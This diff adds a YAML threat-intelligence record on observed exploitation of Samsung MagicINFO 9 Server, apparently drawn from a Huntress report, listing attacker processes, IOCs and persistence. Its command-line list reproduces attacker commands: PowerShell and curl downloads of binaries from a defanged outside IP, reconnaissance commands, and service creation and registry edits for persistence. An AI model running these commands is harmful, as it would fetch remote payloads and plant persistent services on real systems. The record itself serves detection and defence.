@@ -1,0 +1,58 @@
+description: Huntress observed limited exploitation activity involving the Samsung
+  MagicINFO 9 Server. Attackers exploited a publicly available proof-of-concept for
+  a vulnerability impacting versions 21.1050.0 and 21.1040.2.
+attribution: Unknown
+malware_families:
+- PHP5.3.8
+TTPs:
+  processes:
+  - cmd.exe
+  - whoami.exe
+  - arp.exe
+  - php-cli.exe
+  - php-fpm.exe
+  commandline:
+  - cmd.exe /c whoami
+  - cmd.exe /c arp -a
+  - C:\\MagicInfo Premium\\tomcat\\bin\\php-cli.exe
+  - powershell.exe -Command ""(New-Object System.Net.WebClient).DownloadFile('http://185.225.226[.]53/php_cli.exe', 'php-fpm.exe')""
+  - powershell.exe -Command ""(New-Object System.Net.WebClient).DownloadFile('http://185.225.226[.]53/srvany.exe', 'php-cli.exe')""
+  - cmd.exe /c ""if not exist ""php-fpm.exe"" curl.exe --output php-fpm.exe http://185.225.226[.]53/php_cli.exe""
+  - cmd.exe /c ""if not exist ""php-cli.exe"" curl.exe --output php-cli.exe http://185.225.226[.]53/srvany.exe""
+  - cmd.exe /c dir
+  - cmd.exe /c ""sc stop ""PHP5.3.8""""
+  - md.exe /c ""sc delete ""PHP5.3.8""""
+  - cmd.exe /c ""sc create ""PHP5.3.8"" depend= Tcpip start= auto binPath= ""C:\MagicInfo Premium\tomcat\bin\php-cli.exe""""
+  - sc  stop ""PHP5.3.8""
+  - cmd.exe /c ""sc description ""PHP5.3.8"" ""PHP/5.3.8 Server""""
+  - sc  delete ""PHP5.3.8""
+  - cmd.exe /c ""reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PHP5.3.8\Parameters /f""
+  - sc  create ""PHP5.3.8"" depend= Tcpip start= auto binPath= ""C:\MagicInfo Premium\tomcat\bin\php-cli.exe""
+  - cmd.exe /c ""reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PHP5.3.8\Parameters /f /v Application /t REG_SZ /d ""C:\MagicInfo Premium\tomcat\bin\php-fpm.exe""""
+  - sc  description ""PHP5.3.8"" ""PHP/5.3.8 Server""
+  - cmd.exe /c ""reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PHP5.3.8\Parameters /f /v AppParameters /t REG_SZ /d ""-device-name=magicw -password=[redacted] -accept-tos -email=[redacted]@gmail.com""""
+  - reg  add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PHP5.3.8\Parameters /f
+  - cmd.exe /c ""sc start ""PHP5.3.8""""
+  - reg  add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PHP5.3.8\Parameters /f /v Application /t REG_SZ /d ""C:\MagicInfo Premium\tomcat\bin\php-fpm.exe""
+  - reg  add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PHP5.3.8\Parameters /f /v AppParameters /t REG_SZ /d ""-device-name=magicw -password=[redacted] -accept-tos -email=[redacted]@gmail.com""
+  - sc  start ""PHP5.3.8""
+  - C:\MagicInfo Premium\tomcat\bin\php-cli.exe""
+  - C:\MagicInfo Premium\tomcat\bin\php-fpm.exe"" -device-name=magicw -password=[redacted] -accept-tos -email=[redacted]@gmail.com
+
+  registry_keys: []
+  image_load: []
+  network_connections: []
+  file_modifications:
+  - C:\\MagicInfo Premium\\tomcat\\bin\\php-cli.exe
+  persistence:
+  - Service installation with auto start type.
+  pipes: []
+  process_relations: []
+IOCs:
+- PHP5.3.8
+authors:
+- Jamie Levy
+- Lindsey O'Donnell-Welch
+reference: https://www.huntress.com/blog/post-exploitation-activities-observed-from-samsung-magicinfo-9-server-flaw
+date_of_publication: May 09, 2025
+file_creation_date: May 16, 2025
